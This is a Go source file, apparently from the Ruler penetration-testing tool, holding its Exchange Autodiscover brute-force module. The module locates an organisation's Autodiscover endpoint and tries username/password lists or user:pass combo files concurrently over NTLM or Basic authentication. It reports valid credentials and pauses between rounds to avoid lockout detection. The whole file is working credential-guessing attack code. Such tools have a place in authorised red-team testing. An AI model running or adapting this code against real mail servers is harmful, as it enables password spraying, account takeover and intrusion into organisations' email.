package autodiscover

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"regexp"
	"strings"
	"time"

	"github.com/sensepost/ruler/http-ntlm"
	"github.com/sensepost/ruler/utils"
)

//Result struct holds the result of a bruteforce attempt
type Result struct {
	Username string
	Password string
	Index    int
	Status   int
	Error    error
}

var concurrency = 5 //limit the number of consecutive attempts

func autodiscoverDomain(domain string) string {
	var autodiscoverURL string

	//check if this is just a domain or a redirect (starts with http[s]://)
	if m, _ := regexp.Match("http[s]?://", []byte(domain)); m == true {
		autodiscoverURL = domain
	} else {
		//create the autodiscover url
		if autodiscoverStep == 0 {
			autodiscoverURL = createAutodiscover(domain, true)
			if autodiscoverURL == "" {
				autodiscoverStep++
			}
		}
		if autodiscoverStep == 1 {
			autodiscoverURL = createAutodiscover(fmt.Sprintf("autodiscover.%s", domain), true)
			if autodiscoverURL == "" {
				autodiscoverStep++
			}
		}
		if autodiscoverStep == 2 {
			autodiscoverURL = createAutodiscover(fmt.Sprintf("autodiscover.%s", domain), false)
			if autodiscoverURL == "" {
				return ""
			}
		}
	}

	utils.Trace.Printf("Autodiscover step %d - URL: %s\n", autodiscoverStep, autodiscoverURL)

	req, err := http.NewRequest("GET", autodiscoverURL, nil)
	req.Header.Add("Content-Type", "text/xml")

	client := http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		if autodiscoverStep < 2 {
			autodiscoverStep++
			return autodiscoverDomain(domain)
		}
		return ""
	}
	if resp.StatusCode == 401 || resp.StatusCode == 403 {
		return autodiscoverURL
	}
	if autodiscoverStep < 2 {
		autodiscoverStep++
		return autodiscoverDomain(domain)
	}
	return ""
}

//BruteForce function takes a domain/URL, file path to users and filepath to passwords whether to use BASIC auth and to trust insecure SSL
//And whether to stop on success
func BruteForce(domain, usersFile, passwordsFile string, basic, insecure, stopSuccess, verbose bool, consc, delay int) {
	utils.Info.Println("Trying to Autodiscover domain")
	autodiscoverURL := autodiscoverDomain(domain)

	if autodiscoverURL == "" {
		return
	}
	usernames := readFile(usersFile)
	if usernames == nil {
		return
	}
	passwords := readFile(passwordsFile)
	if passwords == nil {
		return
	}

	attempts := 0
	stp := false

	for _, p := range passwords {
		if p != "" {
			attempts++
		}
		sem := make(chan bool, concurrency)

		for ui, u := range usernames {
			if u == "" || p == "" {
				continue
			}

			sem <- true

			go func(u string, p string, i int) {
				defer func() { <-sem }()
				out := connect(autodiscoverURL, u, p, basic, insecure)
				out.Index = i

				if verbose == true && out.Status != 200 {
					utils.Fail.Printf("Failed: %s:%s\n", out.Username, out.Password)
					if out.Error != nil {
						utils.Error.Printf("An error occured in connection - %s\n", out.Error)
					}
				}
				if out.Status == 200 {
					utils.Info.Printf("\033[96mSuccess: %s:%s\033[0m\n", out.Username, out.Password)
					//remove username from username list (we don't need to brute something we know)
					usernames = append(usernames[:out.Index], usernames[out.Index+1:]...)
					if stopSuccess == true {
						stp = true

					}
				}
			}(u, p, ui)

		}
		if stp == true {
			return
		}
		for i := 0; i < cap(sem); i++ {
			sem <- true
		}

		if attempts == consc {
			utils.Info.Printf("\033[31mMultiple attempts. To prevent lockout - delaying for %d minutes.\033[0m\n", delay)
			time.Sleep(time.Minute * (time.Duration)(delay))
			attempts = 0
		}
	}
}

//UserPassBruteForce function does a bruteforce using a supplied user:pass file
func UserPassBruteForce(domain, userpassFile string, basic, insecure, stopSuccess, verbose bool, consc, delay int) {
	utils.Info.Println("Trying to Autodiscover domain")
	autodiscoverURL := autodiscoverDomain(domain)

	if autodiscoverURL == "" {
		return
	}
	userpass := readFile(userpassFile)
	if userpass == nil {
		return
	}

	count := 0
	sem := make(chan bool, concurrency)
	stp := false
	for _, up := range userpass {
		count++
		if up == "" {
			continue
		}
		// verify colon-delimited username:password format
		s := strings.SplitN(up, ":", 2)
		if len(s) < 2 {
			utils.Fail.Printf("Skipping improperly formatted entry in %s:%d\n", userpassFile, count)
			continue
		}
		u, p := s[0], s[1]
		count = 0

		//skip blank username
		if u == "" {
			continue
		}

		sem <- true

		go func(u string, p string) {
			defer func() { <-sem }()
			out := connect(autodiscoverURL, u, p, basic, insecure)
			if verbose == true && out.Status != 200 {
				utils.Fail.Printf("Failed: %s:%s\n", out.Username, out.Password)
				if out.Error != nil {
					utils.Error.Printf("An error occured in connection - %s\n", out.Error)
				}
			}
			if out.Status == 200 {
				utils.Info.Printf("\033[96mSuccess: %s:%s\033[0m\n", out.Username, out.Password)
			}
			if out.Status == 200 && stopSuccess == true {
				stp = true
			}
		}(u, p)

	}
	if stp == true {
		return
	}
	for i := 0; i < cap(sem); i++ {
		sem <- true
	}
}

func readFile(filename string) []string {
	var outputs []string

	data, err := ioutil.ReadFile(filename)
	if err != nil {
		utils.Error.Println("Input file not found")
		return nil
	}

	for _, line := range strings.Split(string(data), "\n") {
		outputs = append(outputs, line)
	}
	return outputs
}

func connect(autodiscoverURL, user, password string, basic, insecure bool) Result {
	result := Result{user, password, -1, -1, nil}

	cookie, _ := cookiejar.New(nil)
	client := http.Client{}
	if basic == false {
		//check if this is a first request or a redirect
		//create an ntml http client
		client = http.Client{
			Transport: &httpntlm.NtlmTransport{
				Domain:    "",
				User:      user,
				Password:  password,
				Insecure:  insecure,
				CookieJar: cookie,
			},
		}
	}

	req, err := http.NewRequest("GET", autodiscoverURL, nil)
	req.Header.Add("Content-Type", "text/xml")

	//if we have been redirected to outlook, change the auth header to basic auth
	if basic == false {
		req.SetBasicAuth(user, password)
	}

	resp, err := client.Do(req)

	if err != nil {
		//check if this error was because of ntml auth when basic auth was expected.
		if m, _ := regexp.Match("illegal base64", []byte(err.Error())); m == true {
			client = http.Client{Transport: InsecureRedirectsO365{User: user, Pass: password, Insecure: insecure}}
			resp, err = client.Do(req)
		} else {
			result.Error = err
			return result
		}

	}

	defer resp.Body.Close()

	result.Status = resp.StatusCode
	return result
}
